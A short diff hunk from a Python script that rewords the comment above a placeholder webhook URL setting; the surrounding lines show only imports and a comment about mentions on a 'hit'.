@@ -4,7 +4,7 @@ import json
 
 from urllib.request import Request, urlopen
 
-# your webhook URL
+# put your webhook url here
 WEBHOOK_URL = 'WEBHOOK HERE'
 
 # mentions you when you get a hit
